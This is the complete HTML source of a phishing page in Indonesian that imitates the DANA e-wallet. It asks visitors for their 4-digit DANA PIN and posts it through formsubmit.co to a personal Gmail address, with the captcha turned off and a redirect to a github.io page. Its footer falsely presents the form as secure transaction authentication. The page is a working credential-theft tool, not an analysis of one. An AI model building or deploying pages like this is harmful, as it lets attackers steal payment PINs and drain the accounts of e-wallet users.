<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Kode otp</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #008CFF;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h2 {
      margin-bottom: 20px;
    }
    form {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }
    input[type="password"] {
      font-size: 28px;
      text-align: center;
      letter-spacing: 10px;
      width: 200px;
      padding: 12px;
      border: none;
      border-radius: 8px;
      outline: none;
    }
    button {
      background-color: white;
      color: #008CFF;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }
    .info {
      font-size: 14px;
      margin-top: 10px;
      text-align: center;
      max-width: 300px;
    }
  </style>
</head>
<body>
  <h2>Masukkan PIN DANA</h2>
  <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
    <input type="password" name="PIN" maxlength="4" pattern="\d{4}" placeholder="••••••" required />
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://b813743.github.io/Testing-/">
    <button type="submit">KONFIRMASI</button>
  </form>
  <div class="info">
    Dengan memasukkan otp, kamu menyetujui transaksi dan autentikasi aman melalui aplikasi.
  </div>
</body>
</html>
